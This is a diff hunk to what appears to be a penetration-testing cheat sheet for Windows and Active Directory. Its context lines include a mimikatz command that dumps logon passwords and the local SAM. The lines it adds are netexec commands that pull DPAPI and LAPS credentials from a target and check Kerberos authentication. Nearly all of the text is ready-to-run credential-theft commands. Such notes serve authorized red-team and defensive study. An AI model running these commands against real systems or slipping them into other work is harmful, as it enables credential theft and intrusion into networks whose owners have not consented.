@@ -87,6 +87,12 @@ SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_princ
 [if an Administrator, dump the local SAM and LSA using secretsdump or mimikatz]
 .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
 
+[check if you can dump dpapi credentials with nxc or cme]
+netexec smb target -u username -p password --laps --dpapi
+
+[check if you can authenticate via kerberos]
+netexec smb target -u username -p password -k
+
 ```
 
 
